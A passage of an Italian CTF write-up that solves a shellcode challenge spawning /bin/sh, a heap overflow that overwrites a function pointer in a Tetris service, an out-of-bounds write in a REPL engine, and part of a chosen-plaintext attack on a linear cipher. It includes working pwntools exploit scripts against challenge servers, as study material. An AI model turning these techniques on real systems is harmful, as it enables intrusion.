<p>La soluzione prevedeva la scrittura di uno script asm completo nella struttura corretta e fargli fare ci√≤ che volevamo. Ho deciso di far avviare una shell, poi ho codificato lo script in base64 e l‚Äôho inviato al server.</p>
<h4 id="script-3">Script<a hidden class="anchor" aria-hidden="true" href="#script-3">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="err">?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Chiama execve(&#39;/bin/sh&#39;) e spawna una shell</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">section .data
</span></span></span><span class="line"><span class="cl"><span class="s2">    path    db &#39;/bin/sh&#39;, 0         
</span></span></span><span class="line"><span class="cl"><span class="s2">    envp    dd 0                    
</span></span></span><span class="line"><span class="cl"><span class="s2">section .text
</span></span></span><span class="line"><span class="cl"><span class="s2">    global _start
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">_start:
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov eax, 11          ; syscall number for execve
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov ebx, path        ; filename pointer
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, envp        ; envp pointer
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    int 0x80             ; call kernel
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov eax, 1
</span></span></span><span class="line"><span class="cl"><span class="s2">    xor ebx, ebx
</span></span></span><span class="line"><span class="cl"><span class="s2">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="tetrastack">Tetrastack<a hidden class="anchor" aria-hidden="true" href="#tetrastack">#</a></h3>
<h4 id="analisi-5">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-5">#</a></h4>
<p>Tetrastack √® un servizio che ci permette di giocare a Tetris.</p>
<p>Analizzando le varie voci di menu, si nota un‚Äôopzione per salvare il proprio nome, ma solo a partita finita.
La funzione decompilata <code>set_name</code> √® la seguente:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">set_name</span><span class="p">(</span><span class="n">Player</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">got</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span></span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">board</span><span class="o">-&gt;</span><span class="n">game_over</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter display name length:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nf">read_long</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Enter display name bytes:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">got</span> <span class="o">=</span> <span class="nf">read_n</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span></code></pre></div><p>Come si vede, c‚Äô√® una vulnerabilit√† nel modo in cui viene letta la lunghezza del nome. Esiste un controllo sul limite inferiore (n &gt; 0) ma non su quello superiore (n &lt; 64), quindi possiamo inviare ad esempio 255 per effettuare un buffer overflow.</p>
<p>Per ottenere qualcosa dall‚Äôoverflow, dobbiamo capire dove si trova <code>player-&gt;name</code> in memoria e cosa c‚Äô√® subito dopo.</p>
<p>La risposta sta nella <code>main</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">player</span> <span class="o">=</span> <span class="p">(</span><span class="n">Player</span> <span class="o">*</span><span class="p">)</span><span class="nf">calloc</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">player</span><span class="o">-&gt;</span><span class="n">name_cap</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">player</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">player</span><span class="o">-&gt;</span><span class="n">name_cap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span> <span class="o">=</span> <span class="p">(</span><span class="n">Callbacks</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span><span class="o">-&gt;</span><span class="n">on_gameover</span> <span class="o">=</span> <span class="n">real_gameover</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span><span class="o">-&gt;</span><span class="n">on_lineclear</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span></code></pre></div><p>Come si vede, il nome sta sull‚Äôheap, e subito dopo c‚Äô√® una struct <code>Callbacks</code> che contiene due puntatori a funzione: <code>on_gameover</code> e <code>on_lineclear</code>.</p>
<h4 id="soluzione-5">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-5">#</a></h4>
<p>Con l‚Äôaiuto di GDB ho trovato gli offset precisi sull‚Äôheap e ho potuto sovrascrivere il puntatore a funzione <code>on_gameover</code> con l‚Äôindirizzo di <code>win</code>.</p>
<h4 id="script-4">Script<a hidden class="anchor" aria-hidden="true" href="#script-4">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./tetrastack_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;kgx&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8a0e1141.ctf.ac.upt.ro&#34;</span><span class="p">,</span> <span class="mi">9449</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">                                b main
</span></span></span><span class="line"><span class="cl"><span class="s1">                                b set_name
</span></span></span><span class="line"><span class="cl"><span class="s1">                                continue
</span></span></span><span class="line"><span class="cl"><span class="s1">                      &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">prompt</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;8) Quit&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;Enter display name length&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">data</span><span class="p">,</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">prompt</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">data</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reach_game_over</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">max_steps</span><span class="o">=</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">,</span> <span class="n">got_prompt</span> <span class="o">=</span> <span class="n">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">got_prompt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_steps</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">,</span> <span class="n">got_prompt</span> <span class="o">=</span> <span class="n">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">got_prompt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Reached name prompt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Failed to trigger game over&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">reach_game_over</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;88&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bytes:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># r.interactive()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="mini-e8">mini-e8<a hidden class="anchor" aria-hidden="true" href="#mini-e8">#</a></h3>
<h4 id="analisi-6">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-6">#</a></h4>
<p><code>mini-e8</code> √® un piccolo binario tipo REPL ‚Äúengine‚Äù. Il costruttore dell‚ÄôEngine legge <code>flag.txt</code>, calcola un checksum XOR scorrevole da 64 byte, lo fa XOR con <code>0x7E3A829F</code> e memorizza un <code>flag_header</code> di 16 byte seguito dai byte della flag in un‚Äôarena puntata da <code>(QWORD*)Engine + 5</code>. Un buffer di byte in stile JS condivide questa arena <strong>davanti</strong> al flag_header.</p>
<h5 id="layout-dellheader-dword-little-endian">Layout dell‚Äôheader (dword little-endian)<a hidden class="anchor" aria-hidden="true" href="#layout-dellheader-dword-little-endian">#</a></h5>
<pre tabindex="0"><code>flag_header[0] = 0x00000001          # deve essere forzato a 0 per getflag
flag_header[1] = checksum(flag)^0x7E3A829F
flag_header[2] = 0x8BADF00D          # costante magica controllata da getflag
flag_header[3] = 0x00000000          # diventa il nostro ‚Äúunlock‚Äù; serve 42 prima della seconda opt
</code></pre><p>I byte della flag iniziano a flag_header + 0x10.</p>
<h5 id="funzioni-critiche">Funzioni critiche<a hidden class="anchor" aria-hidden="true" href="#funzioni-critiche">#</a></h5>
<ul>
<li>
<p>Engine::Engine: scrive flag_header + flag nell‚Äôarena;</p>
</li>
<li>
<p>compute_checksum(flag): XOR scorrevole dei primi 64 byte poi XOR con <code>0x7E3A829F</code>.</p>
</li>
<li>
<p>cmd_optimize_function (<code>opt</code>): Prima chiamata abilita la ‚Äúfast mode‚Äù (scrive capacit√† di check). Seconda chiamata: se <code>flag_header[3] == 42</code>, imposta un byte di enable a <code>Engine+0x80</code> a 1.</p>
</li>
<li>
<p>cmd_getflag (<code>getflag</code>) richiede:</p>
<ol>
<li>flag_header[2] == 0x8BADF00D</li>
<li>checksum ricalcolato ^ 0x7E3A829F == flag_header[1]</li>
<li>flag_header[0] == 0</li>
<li>byte di enable a <code>Engine+0x80</code> == 1</li>
</ol>
</li>
</ul>
<h5 id="vulnerabilit√†">Vulnerabilit√†<a hidden class="anchor" aria-hidden="true" href="#vulnerabilit√†">#</a></h5>
<p>In fast mode, <code>write &lt;idx&gt; &lt;val&gt;</code> valida <code>idx &lt; capacity</code> invece di <code>idx &lt; length</code>. La capacit√† &gt; lunghezza, quindi indici oltre il corpo logico del buffer (&gt;= length corrente) possono raggiungere il flag_header adiacente. Questo d√† scritture a singolo byte controllate sui campi dell‚Äôheader.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">a2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">||</span> <span class="n">a2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="n">a2</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h5 id="offset-mappati-ai-byte-dellheader">Offset mappati ai byte dell‚Äôheader<a hidden class="anchor" aria-hidden="true" href="#offset-mappati-ai-byte-dellheader">#</a></h5>
<p>Dopo la prima <code>opt</code>, dato che il flag_header √® posizionato dopo il buffer in memoria, i seguenti indici (nella REPL) indirizzano il flag_header:</p>
<pre tabindex="0"><code>64..67  -&gt; flag_header[0]
68..71  -&gt; flag_header[1]
72..75  -&gt; flag_header[2]
76..79  -&gt; flag_header[3]
</code></pre><p>Ci basta cambiare flag_header[0] (impostare tutti e quattro i byte a 0) e flag_header[3] (impostare il byte meno significativo a 42 e azzerare il resto) prima di invocare la seconda <code>opt</code>.</p>
<h4 id="soluzione-6">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-6">#</a></h4>
<ul>
<li>Eseguire <code>opt</code> una volta per entrare nella modalit√† veloce (controllo su capacity).</li>
<li>Azzerare <code>flag_header[0]</code> scrivendo 0 agli offset 64‚Äì67.</li>
<li>Impostare il valore di sblocco: scrivere i byte 76‚Äì79 come <code>42, 0, 0, 0</code> cos√¨ che <code>flag_header[3] == 42</code>.</li>
<li>Chiamare <code>opt</code> di nuovo; la seconda ottimizzazione vede header[3] == 42 e attiva il byte di enable.</li>
<li>Chiamare <code>getflag</code>; tutte le condizioni sono soddisfatte e stampa la flag da header+0x10.</li>
</ul>
<pre tabindex="0"><code>opt
write 64 0
write 65 0
write 66 0
write 67 0
write 76 42
write 77 0
write 78 0
write 79 0
opt
getflag
</code></pre><h4 id="script-5">Script<a hidden class="anchor" aria-hidden="true" href="#script-5">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">steps</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;opt&#34;</span><span class="p">,</span>                <span class="c1"># entra nel fast path</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 64 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 0</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 65 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 1</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 66 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 2</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 67 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 3</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 76 42&#34;</span><span class="p">,</span>        <span class="c1"># flag_header[3] byte 0 -&gt; 42</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 77 0&#34;</span><span class="p">,</span>         <span class="c1"># azzera i restanti</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 78 0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 79 0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;opt&#34;</span><span class="p">,</span>                <span class="c1"># seconda optimize attiva se header[3]==42</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;getflag&#34;</span><span class="p">,</span>            <span class="c1"># stampa la flag se i check passano</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><h2 id="crittografia-">Crittografia üîë<a hidden class="anchor" aria-hidden="true" href="#crittografia-">#</a></h2>
<h3 id="sparse-hills">Sparse Hills<a hidden class="anchor" aria-hidden="true" href="#sparse-hills">#</a></h3>
<h4 id="analisi-7">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-7">#</a></h4>
<p>Abbiamo modellato il servizio come un semplice cifrario lineare su Z_257, dove il server calcola $c = K m \bmod 257$. La stessa matrice chiave 257√ó257 √® riutilizzata, gli input sono zero-padding fino a un blocco intero, e gli output sono stampati come numeri esadecimali a tre cifre. Poich√© l‚Äôoracolo consente di cifrare qualsiasi cosa e la mappatura √® lineare, possiamo rivelare le colonne di $K$ cifrando i vettori base. Questo significa che possiamo recuperare la chiave e, da l√¨, la flag.</p>
<h4 id="soluzione-7">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-7">#</a></h4>
<p>Per prima cosa prendo la flag cifrata cos√¨ abbiamo il suo ciphertext. Poi cifriamo ciascun vettore canonico, una posizione a 1 e il resto a 0. Ogni query restituisce una colonna di $K$. Impilandole, ricostruiamo l‚Äôintera matrice. Inverto questa matrice modulo 257 con Gauss-Jordan (gli inversi di Fermat rendono facile la divisione), moltiplico l‚Äôinversa per il ciphertext della flag per ottenere il vettore di plaintext, converto 256 in 0 quando trasformo in byte, rimuovo lo zero-padding e decodifico in UTF-8. Servono esattamente 257 cifrature per il recupero, e l‚Äôinversione √® veloce a questa dimensione.</p>
<h4 id="script-6">Script<a hidden class="anchor" aria-hidden="true" href="#script-6">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span> <span class="mi">257</span>  <span class="c1"># Prime modulus</span>
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">257</span>  <span class="c1"># Block length == dimension</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">marker</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Read from socket until `marker` appears.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">marker</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Read until the socket is closed and return all bytes.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">65536</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
